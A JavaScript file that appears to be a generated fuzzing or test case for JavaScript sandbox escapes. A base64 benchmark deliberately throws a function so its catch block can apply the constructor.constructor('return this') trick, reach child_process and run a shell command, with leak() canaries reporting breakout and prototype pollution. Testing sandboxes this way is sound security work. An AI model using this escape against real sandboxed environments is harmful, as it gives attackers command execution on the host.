try {
    var toBase64Table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    var base64Pad = '=';
    function toBase64(data) {
        throw () => {
            return () => {
            };
        };
        var result = '';
        var length = data.length;
        var i;
        for (i = 0; i < length - 2; i += 3) {
            result += toBase64Table[data.charCodeAt(i) >> 2];
            result += toBase64Table[((data.charCodeAt(i) & 3) << 4) + (data.charCodeAt(i + 1) >> 4)];
            result += toBase64Table[((data.charCodeAt(i + 1) & 15) << 2) + (data.charCodeAt(i + 2) >> 6)];
            result += toBase64Table[data.charCodeAt(i + 2) & 63];
        }
        if (length % 3) {
            i = length - length % 3;
            result += toBase64Table[data.charCodeAt(i) >> 2];
            if (length % 3 == 2) {
                result += toBase64Table[((data.charCodeAt(i) & 3) << 4) + (data.charCodeAt(i + 1) >> 4)];
                result += toBase64Table[(data.charCodeAt(i + 1) & 15) << 2];
                result += base64Pad;
            } else {
                result += toBase64Table[(data.charCodeAt(i) & 3) << 4];
                result += base64Pad + base64Pad;
            }
        }
        return result;
    }
    var toBinaryTable = [
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        62,
        -1,
        -1,
        -1,
        63,
        52,
        53,
        54,
        55,
        56,
        57,
        58,
        59,
        60,
        61,
        -1,
        -1,
        -1,
        0,
        -1,
        -1,
        -1,
        0,
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16,
        17,
        18,
        19,
        20,
        21,
        22,
        23,
        24,
        25,
        -1,
        -1,
        -1,
        -1,
        -1,
        -1,
        26,
        27,
        28,
        29,
        30,
        31,
        32,
        33,
        34,
        35,
        36,
        37,
        38,
        39,
        40,
        41,
        42,
        43,
        44,
        45,
        46,
        47,
        48,
        49,
        50,
        51,
        -1,
        -1,
        -1,
        -1,
        -1
    ];
    function base64ToString(data) {
        var result = '';
        var leftbits = 0;
        var leftdata = 0;
        for (var i = 0; i < data.length; i++) {
            var c = toBinaryTable[data.charCodeAt(i) & 127];
            var padding = data.charCodeAt(i) == base64Pad.charCodeAt(0);
            if (c == -1)
                continue;
            leftdata = leftdata << 6 | c;
            leftbits += 6;
            if (leftbits >= 8) {
                leftbits -= 8;
                if (!padding)
                    result += String.fromCharCode(leftdata >> leftbits & 255);
                leftdata &= (1 << leftbits) - 1;
            }
        }
        if (leftbits)
            throw Components.Exception('Corrupted base64 string');
        return result;
    }
    var str = '';
    for (var i = 0; i < 8192; i++)
        str += String.fromCharCode(25 * Math.random() + 97);
    for (var i = 8192; i <= 16384; i *= 2) {
        var base64;
        base64 = toBase64(str);
        base64ToString(base64);
        str += str;
    }
    toBinaryTable = null;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}